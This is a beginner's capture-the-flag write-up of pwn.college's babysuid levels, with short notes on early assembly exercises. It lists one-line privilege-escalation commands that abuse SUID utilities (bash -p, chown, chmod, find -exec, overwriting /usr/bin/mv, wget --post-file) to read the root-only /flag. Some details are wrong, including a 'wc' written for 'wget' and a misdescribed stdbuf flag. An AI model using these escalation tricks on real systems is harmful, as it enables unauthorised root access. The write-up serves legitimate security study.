---
title: "Notes of pwn.college babysuid&embryoasm levels"
date: "2022-01-04"
author: "uoft-flyfreejay"
description: "short notes for pwn.college dojo's pre-pwn exercises"
---

# Intro

My first ever write-ups (woohoo)!

The first half of this page will have short notes on each level of pwn.college's Program Misues module exercises, babysuid.
The module is about privilege escalation. Each level will let me use one program with unnecessary SUID, and I will have to *abuse* that program to read **/flag** using the root privileges. 

Let's get started then!

## babysuid

### level1

- short write-ups

The first level that introduces us to babysuid. We will first move to `/challenge` folder and use `ls` right after by doing

```bash
cd /challenge; ls
```

This shows that there exists an executable name `babysuid_level1` inside the folder. 

Running this tells me that the program has set SUID bit on `/usr/bin/cat`. Now we can use `cat` to read the flag! 

```bash
cat /flag
```

### level2

- short write-ups

From now on, assume that the first thing I will do is navigating to */challenge* directory and running the executable there to set the SUID bit on the necessary program. 

This time we are using `more` utility. Just like `cat`, we can simply run

```bash
more /flag
```

and there we go!

### level3

- short write-ups

This time we are using `less`. Another freebie level.

```bash
less /flag
```

### level4

This time we are using `tail`.

```bash
tail /flag
```

### level5

This time we are using `head`.

```bash
head /flag
```

### level6

This time we are using `sort`. 

```bash
sort /flag
```

the `/flag` file only contained one line of text, which is the flag. So using `sort` like the previous commands had no problem. 

### level7

This time we are using the infamous `vim`.

```bash
vim /flag
```

And we can look at the contents as we are 'editing' it with `vim`. As you can see, the programs given to us are getting further and further from a simple file-viewing utility. 

### level8

This time we are using `emacs` (TEAM EMACS FOR THE WIN).

```bash
emacs /flag
```

### level9

This time we are using `nano` 

```bash
nano /flag
```

### level10

This time we are using `rev`. 

This time we would need to think a bit. Since `rev` will return the contents of `/flag` in reversed order, applying `rev` twice will give us the original contents! We will do so by using the pipes:

```bash
rev /flag | rev
```

### level11

This time we are using `od`.

I wasn't too familiar with `od`, but a little googling taught me that it is a program that will read me the contents of a file in various formats (binary, hexadecinal, characters, etc...).

We can use a combination of `-An` and `-c` flag to view the contents of the files in character format, ignoring the byte offsets. 

```bash
od -An -c /flag
```

The output is still not very clean, as each characters are seperated by white spaces. I decided to clean it using python.

```python
flag = 'p   w   n   .   c   ...'
print(''.join(flag.split()))
```

### level12

This time we are using `hd`.

It's also called `hexdump`, and it is an utility that is similiar to `od`. It will let me view the file in specified format. Right now, I am only interested in the string representation, so including `-e` flag will help me.

```bash
hd -e /flag
```

### level13

This time we are using `xxd`.

First time using this utility. Looking at the man page showed me that it creates a hexdump of a given file (or from STDIN if no file is specified). I decided to test it out and simply called:

```bash
xxd /flag
```

But it seems that `xxd` also prints out the string representation of the data along with the hexdump by default. Got the flag! 

### level14

This time we are using `base32`.

This will let us base32 encode/decode the file. Similar to `rev`'s approach, I will first encode the contents and pipe the output to decode to get the original flag. 

```bash
base32 /flag | base32 -d
```

### level15

This time we are using `base64`.

Same approach as `level14`.

```bash
base64 /flag | base64 -d
```

### level16

This time we are using `split`.

This utility will help us 'split' or break down the file into pieces into a new output file. I am pretty sure that our `/flag` file only contains one line (which is our flag) so simply calling:

```bash
split /flag
``` 

will generate a new outcome file in your current directory called `xaa`. Reading it with `cat` will give us the flag! 

### level17

This time we are using `gzip`.

It seems like I am allowed to use the whole `gzip` suite in this challenge. I can simply compress `/flag` and view the compressed file with `zcat`. 

```bash
gzip /flag
zcat /flag.gz
```

### level18

This time we are using `bzip2`.

Same approach as `gzip`. However, this challenge I could not use the other suite utilities (`bunnzip2`, `bzcat`). But those are just `bzip2` with extra flags anyways.

```bash
bzip2 /flag
bzip2 -c -d /flag.bz2
```

### level19

This time we are using `zip`.

Same approach as other compression utilities. I will first compress `/flag` into an archive and view the file using `zcat`. This works, because there will be only one file (`/flag`) in our archive.

```bash
zip flag.zip /flag
zcat flag.zip
```

### level20

This time we are using `tar`.

A quick googling revealed to me that `vim` has a built-in functionality that lets me view the contents of a tar archive. Let's compress `/flag` into a tar archive and view it with `vim`.

```bash
tar -cvf flag.tar /flag
vim flag.tar
```

### level21

This time we are using `ar`.

Same approach as above. Create an archive, and then read with `vim`.

```bash
ar r flag.a /flag
vim flag.a
```

### level22

This time we are using `cpio`.

Same approach as above. Create an archive, and then read with `vim`.

```bash
echo /flag | cpio -o > flag.cpio
vim flag.cpio
```

### level23

This time we are using `genisoimage`.

This level was **VERY** interesting. `genisoimage` is an outdated program that creates `iso` disc images. My first naive attempt was to try to create a disc image and `vim` it like usual. However, it just printed the error message that I had no permissino to do so! 

A little bit of more research and watching the office hour session for this challenge revealed that `genisoimage` is SUID-proof. Investigating the system calls of `genisoimage` showed me that it actually gets the user ID and sets the effective user ID as the original user, not the root. So I had to cycle through bunch of flags that would make the operation happen before `genisoimage` does that silly thing. 

And the answer was...

```bash
genisoimage -sort /flag
```

- side-notes

The exploit here is actually a 0-day vulnerability. I did not actually use the SUID power that `pwn.college` allowed me, but exploited an actual vulnerability that the program originally had. There is a reason why this is outdated!

### level24

This time we are using `env`.

`env` alone will just print out all the environmental variables. However, adding `-i` flag lets me execute a command in an empty environmental. 

```bash
env -i cat /flag
```

### level25

This time we are using `find`.

We can 'find' a specific file with `find`. Not only that, `-exec [COMMAND] {} +` flag allows me to execte the specified command! 

```bash
find -name flag -exec cat {} +
```

### level26

This time we are using `make`.

While most people use `make` to compile, here I will use it to simply run `cat` using the parent SUID power. 

I edit the Makefile to be

```
all:
    cat /flag
```

and simply call

```bash
make
```

### level27

This time we are using `nice`.

Another scheduling program that lets me execute a command in the name of the Almighty. 

```bash
nice cat /flag
```

### level28

This time we are using `timeout`.

This program lets us execute a command within a specific time interval. The man page did not tell me what the unit of measurement is, so I just used 1 like this:

```bash
timeout 1 cat /flag
```

But whatever it is, I guess `cat` is fast enough and I got my flag.

### level29

This time we are using `stdbuf`.

This program lets us execute a command in a modified buffering for its standard streams. I did not want to deal with any modified behaviours, so I used `L` mode to make my standard out stream unbuffered. 

```bash
stdbuf -o L cat /flag
```

### level30

This time we are using `setarch`.

'`setarch` modifies execution domains and process personality flags.' (I do not quite understand what it exactly does). Since I am only interested in running `cat`, most architecture types should be OK

```bash
setarch i386 cat /flag
```

### level31

This time we are using `watch`.

This program will execute a specified command over a certain time interval, default being every 2 seconds. `-x` lets us to specify which command. 

```bash
watch -x cat /flag
```

### level32

This time we are using `socat`.

`socat` lets me to redirect input and output from different type of system resources like network, *file*, command, socket, and etc. A little bit of googling taught me how to redirect a file as an input. 

```bash
socat PIPE:/flag STDOUT
```

### level33

This time we are using `whiptail`.

`whiptail` displays a text or a file in a dialog box.

```bash
whiptail --textbox /flag 12 8
```

The numbers at the end were required to set the dialog box size.

### level34

This time we are using `awk`.

`awk` allows us to read from a file and perform operations on them. For this challenge, I am only interested in reading. 

```bash
awk '{ print $0 }' /flag
```

### level35

This time we are using `sed`. 

`sed` allows me to perform a text manipulation. Since our flag text starts with `pwn` at the beginning, I decided to change `pwn` to `gwn`. 

```bash
sed 's/pwn/gwn/g' /flag
```

When `sed` prints the outcome, change `gwn` part back to `pwn`. 

### level36

This time we are using `ed`. 

Another text manipulation program. `ed` is used by adding texts, either from STDIO or from a file to the buffer to perform edits. Calling

```bash
ed /flag
```

will add `/flag` contents to the buffer and entering `p` will let us view the buffer. 

### level37

This time we are using `chown`.

This is the killer utility. It changes the ownership of a file. I simply made `/flag` mine and `cat`.

```bash
chown hacker /flag
cat /flag
```

### level38

This time we are using `chmod`.

The plan is to change the read permission of others and simply `cat` the flag.

```bash
chmod o=r /flag
cat /flag
```

### level39

This time we are using `cp`.

It is a famous utility that lets us to copy files. I tried making a copy of `/flag`, but it seems that the copy also inherits the same permissions as the original. However, copying the contents of `/flag` into another file can bypass that. 

```bash
touch a.txt
cp /flag a.txt
cat a.txt
```

### level40

This time we are using `mv`.

Another very interesting level. I was stuck for a couple of minutes looking through the man page to find a way to display a file using `mv`. However, such feature does not exist in `mv`. What is possible however, is run the challenge binary to set the SUID for `/usr/bin/mv`, and use the root privilege to change the name of `/usr/bin/cat` program to `/usr/bin/mv`! Then run the challenge binary once again to set the SUID of `mv` (which is actually `cat`).

```bash
mv /usr/bin/cat /usr/bin/mv
/challenge/babysuid_level40
mv /flag
```

### level41

This time we are using `perl`.

We can run a simple `perl` programs with `-e` commandline option. As I am not very familiar with `perl`, I googled and found this:

```bash
perl -n -e 'print "$. - $_"' /flag
```

### level42

This time we are using `python`.

Python!! Writing a simple script that reads `/flag` would do.

```python
from subprocess import *
Popen(["cat", "/flag"])
```

### level43

This time we are using `ruby`.

I had to write a short ruby script. 

```ruby
exec "cat /flag"
```

### level44

This time we are using `bash`.

In the lecture, the professor pointed out that shell programs like `bash` resets the EUID to the original UID. Adding `-p` when invoking disables that feature.

```bash
bash -p
cat /flag
```

### level45

This time we are using `date`.

This program also let's me to specify a file to print out the date inside the file. Although the contents in `/flag` are not in date format, the program still prints the contents as it gives error. 

```bash
date --file=/flag
```

### level46

This time we are using `dmesg`.

Same as above. View the system log using `/flag` as the input file.

```bash
dmesg --file=/flag
```

### level47

This time we are using `wc`.

`--files0-from` lets me to put `/flag` as the input.

```bash
wc --files0-from /flag
```

### level48

This time we are using `gcc`.

I will make `gcc` force include `/flag` and print out the contents through error. I will just use a random source code c file for source.

```bash
gcc -include /flag a.c
```

### level49

This time we are using `as`.

Same approach as above. Use `-n` option to include `/flag` as the header file and cause `as` to output error messages.

```bash
as -n /flag a.s
```

### level50

This time we are using `wget`.

This is a network downloader. We can establish a server on localhost posting `/flag`, and use `nc` on other terminal to get the file.

```bash
wc --post-file=/flag http://localhost
```

And on the other terminal,

```bash
nc -lp 80
```

Since we are using `http`, port 80 is used.

### level51

This time we are using `ssh-keygen`.

Final level! However, I did not understand the mechanism behind this level as I lack the background knowledge. I referred to the office hour video for the [solution](https://dojo.pwn.college/challenges/misuse), and I am planning to come back to it after I study more in-depth C programming. 

## Final Notes

I got to learn many new Linux commands and utilities in this module. This gave me a rough idea on how hackers could go on to abuse the SUID for *privilege escalation*. With this knowledge gained, let's step forward to the next unit, Assemblies! 

## embryoasm

The next 23 challenges consist of x86-64 Assembly challenges. I will have to write an Assembly code to do what each level asks of me and convert the code into byte format. Let's get hacking!

### level1

This level requires us to change the value of `rdi` register to `0x1337`. Let us use the Intel syntax and write the required Assembly code.

```asm
//name: l1.s
.global _start
.intel_syntax noprefix
_start:
    mov rdi, 0x1337
```

The above code simply puts the value `0x1337` into `rdi`. We will now compile the code and `objcopy` the executable to get the binary.

```bash
gcc -nostdlib --static -o l1.elf l1.s
objcopy --dump-section .text=l1.bin l1.elf
```

Now let's send the contents of `l1.bin` to our challenge executable.

```bash
cat l1.bin | /challenge/$HOSTNAME
```

### level2

This level requires us to add `0x331337` to `rdi` register. We can do this simply by using `add` instruction.

```asm
//name: l2.s
.global _start
.intel_syntax noprefix
_start:
    add rdi, 0x331337
```

From now on, after I write the necessary ASM code, assume that I run the same steps as `level1` and send the bytes to the challenge executable. 

### level3

This level requires us to emulate a following equation: `mx + b`, where `m = rdi`, `x = rsi`, and `b = rdx`. I will multiply `rdi` and `rsi`, storing the result in `rsi` and add `rdx` to `rsi`. Finally, I will move `rsi` to `rax` just like how the level requires.

```asm
//name: l3.s
.global _start
.intel_syntax noprefix
_start:
    imul rsi, rdi
    add rsi, rdx
    mov rax, rsi
```

### level4

This level requires us to simply divide `rdi` by `rsi`. Dividing in x86-64 Assembly works a little differently. We first have to store the dividend into `rax` and call `div reg2`, where `reg2` is a divisor. The result is stored in `rax` and the remainder in `rdx`. 

```asm
//name: l4.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, rdi
    div rsi
```

### level5

This level is similar as the above, but remainders this time! 

```asm
//name: l5.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, rdi
    div rsi
    mov rax, rdx
```

### level6

This level requires me to do modulus operation again but with only using `mov`! Do not panick however. The divisors are each `256` and `65536`, which are very special numbers. They are powers of `16`. Therefore, modulus by them means we are just getting the last 8-bit and 16-bit digits of the registers. We can access them by using lower-bit compatible registers. This is similar to how `5678 % 100` is just `78`. 

```asm
//name: l6.s
.global _start
.intel_syntax noprefix
_start:
    mov rax, 0
    mov al, dil
    mov rbx, 0
    mov bx, si
```